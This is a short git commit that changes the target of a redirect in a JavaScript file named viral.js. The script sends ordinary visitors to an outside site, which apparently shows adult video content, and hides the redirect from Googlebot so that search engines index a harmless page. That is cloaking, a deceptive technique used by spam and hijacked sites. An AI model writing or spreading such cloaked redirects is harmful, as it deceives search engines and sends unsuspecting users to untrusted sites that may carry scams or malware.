f363b8e0f1511e3139f85d49098b2e7298a3ef54
mayfuas78-ship-it <mayfuas78@gmail.com>
2026-09-25 05:58:43 +0600

    Update viral.js

--- java/viral.js
+++ java/viral.js
@@ -2,7 +2,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://videonsfw.com/hd/?Now";
+  window.location.href = "https://vid.elastichq.org/?now";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
